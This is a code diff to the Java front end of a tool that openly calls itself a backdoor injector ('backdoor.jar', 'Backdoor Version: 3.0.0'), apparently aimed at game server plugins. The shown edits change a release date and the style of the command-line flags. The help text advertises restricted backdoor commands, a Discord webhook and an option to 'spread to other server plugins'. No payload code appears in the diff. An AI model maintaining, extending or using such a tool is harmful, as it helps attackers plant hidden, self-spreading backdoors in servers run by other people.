@@ -48,7 +48,7 @@ public class InjectorGUI{
                         "Created by: Thicc Industries,\n" +
                                 "Additional features by: @DarkReaper231\n" +
                                 "Backdoor Version: 3.0.0\n" +
-                                "Release Date: July 07 2022\n" +
+                                "Release Date: August 08 2022\n" +
                                 "License: GPL v3.0",
                         "Thicc Industries Injector",
                         JOptionPane.INFORMATION_MESSAGE
@@ -161,13 +161,13 @@ public class InjectorGUI{
 
         if(args[0].equals("--help") || args[0].equals("-h")){
             System.out.println("Java -jar backdoor.jar (filename) [options]\n" +
-                    "-help / -h: Display syntax help\n" +
-                    "-offline / -o: Use username authentication (Offline mode servers)\n" +
-                    "-users / -u: Only allow specified UUID/Usernames to use backdoor commands (Separate by commas)\n" +
-                    "-prefix / -p: Command prefix (default: #)\n" +
-                    "-discord / -d: Discord webhook (See readme)\n" +
-                    "-spread / -s : Spread to other server plugins\n" +
-                    "-debug / -b: Display debug messages in console");
+                    "--help / -h: Display syntax help\n" +
+                    "--offline / -o: Use username authentication (Offline mode servers)\n" +
+                    "--users / -u: Only allow specified UUID/Usernames to use backdoor commands (Separate by commas)\n" +
+                    "--prefix / -p: Command prefix (default: #)\n" +
+                    "--discord / -d: Discord webhook (See readme)\n" +
+                    "--spread / -s : Spread to other server plugins\n" +
+                    "--debug / -b: Display debug messages in console");
             return;
         }
 
